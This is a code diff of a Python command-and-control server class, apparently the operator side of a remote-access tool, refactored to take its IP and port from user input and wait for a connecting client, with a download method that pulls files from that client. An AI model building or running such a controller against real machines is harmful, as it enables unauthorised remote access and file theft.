@@ -5,7 +5,14 @@ from time import sleep
 
 class server:
     server_socket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server_ip=""
+    server_port=""
+
     
+    def __init__(self,server_ip,server_port):
+        self.server_ip=server_ip
+        self.server_port=server_port
+        
     def download(self,file_name):
         response = self.server_socket.recv(2048)
         total_response=""
@@ -48,11 +55,11 @@ class server:
                 file.close()
                 
 
-    def server_c2(self,server_ip,server_port,client_num):
-        self.server_ip = server_ip
-        self.server_port = server_port
-        self.server_socket.bind((server_ip,server_port))
-        self.server_socket.listen(client_num)
+    def server_c2_connector(self,):
+        self.server_ip = self.server_ip
+        self.server_port = self.server_port
+        self.server_socket.bind((self.server_ip,int(self.server_port)))
+        self.server_socket.listen(10)
         print("Listening for incoming connections...\n")
         self.server_socket, client_address = self.server_socket.accept()
         print("IP:{} Connected successfully!\n".format(client_address))
@@ -108,8 +115,7 @@ if __name__=="__main__":
 
 
     # If option was 1:
-   # input_ip=input("Enter the IP address:\n")
-    #input_port=input("Enter the port:\n")
-    server_init = server
-    #server_init.server_c2(server_init,input_ip,int(input_port),10)
-    server_init.server_c2(server_init,"127.0.0.1",int(8000),10)
+    input_ip=input("Enter the IP address:\n")
+    input_port=input("Enter the port:\n")
+    c2server = server(input_ip,input_port)
+    c2server.server_c2_connector()
